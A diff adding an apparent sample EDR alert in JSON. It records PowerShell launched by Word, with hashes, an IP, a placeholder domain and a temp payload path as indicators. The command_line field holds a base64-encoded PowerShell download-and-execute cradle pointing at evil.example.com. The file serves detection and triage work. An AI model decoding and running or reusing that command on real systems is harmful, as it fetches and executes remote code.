@@ -1,0 +1,26 @@
+{
+  "alert_id": "ALERT-2025-003-SUSP",
+  "source": "edr-agent",
+  "timestamp": "2025-06-11T08:30:00Z",
+  "event_type": "process_creation",
+  "hostname": "WORKSTATION-USER-05",
+  "process_name": "powershell.exe",
+  "command_line": "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+  "parent_process": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+  "indicators": {
+    "hashes": [
+      "aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d"
+    ],
+    "ips": [
+      "185.130.5.251"
+    ],
+    "domains": [
+      "evil.example.com"
+    ],
+    "file_paths": [
+      "C:\\Users\\victim\\AppData\\Local\\Temp\\payload.ps1"
+    ]
+  },
+  "parent_pid": 4512,
+  "pid": 4892
+}
